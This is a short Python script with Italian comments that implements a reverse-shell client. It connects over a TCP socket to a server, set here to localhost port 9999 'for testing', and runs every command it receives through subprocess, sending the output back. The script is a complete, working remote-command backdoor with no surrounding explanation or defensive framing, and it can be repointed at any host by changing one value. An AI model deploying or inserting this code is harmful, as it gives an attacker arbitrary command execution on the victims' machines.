# Importazione delle librerie necessarie
import socket  # Per la comunicazione di rete
import subprocess  # Per eseguire comandi di sistema
from colorama import Fore, init  # Per l'output colorato nel terminale

# Inizializzazione di colorama per l'output colorato
init()

# Configurazione del client
HOST = "127.0.0.1"  # IP locale per test
PORT = 9999  # Porta a cui connettersi

def connect_to_server():
    """
    Funzione principale per connettersi al server e gestire i comandi
    """
    # Crea il socket del client
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connettiti al server
    client.connect((HOST, PORT))
    print(f"{Fore.GREEN}[+] Connesso al server")

    # Loop principale dei comandi
    while True:
        # Ricevi il comando dal server
        command = client.recv(1024).decode()
        if not command:
            break
        
        # Esegui il comando ricevuto e ottieni l'output
        output = subprocess.getoutput(command)
        # Invia l'output del comando al server
        client.send(output.encode())

# Avvia il client quando lo script viene eseguito
if __name__ == "__main__":
    connect_to_server()